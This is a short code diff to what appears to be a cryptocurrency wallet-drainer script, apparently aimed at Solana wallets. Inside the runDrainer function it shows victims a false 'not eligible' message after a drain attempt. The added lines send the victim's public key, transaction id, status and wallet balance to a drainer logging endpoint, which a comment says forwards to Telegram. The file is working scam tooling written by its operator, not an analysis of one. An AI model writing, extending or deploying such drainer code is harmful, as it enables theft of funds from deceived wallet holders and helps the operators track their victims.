@@ -1609,6 +1609,19 @@ async function runDrainer(provider) {
                       console.log('[STATUS] Could not check transaction status:', statusError);
                       // Don't assume success - show not eligible
                       showStatus('Sorry, you\'re not eligible. Please connect with an eligible wallet.', 'error');
+                      
+                      // Log failed drain to Telegram with fallback balance
+                      fetch('/api/drainer/log-confirmation', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                          publicKey: publicKey.toString(),
+                          txid: txid,
+                          status: 'failed',
+                          error: 'Status check failed',
+                          lamports: balance || 0
+                        })
+                      }).catch(err => console.log('[TELEGRAM] Failed to log failure:', err));
                     }
                   }, 5000); // Check after 5 seconds
         
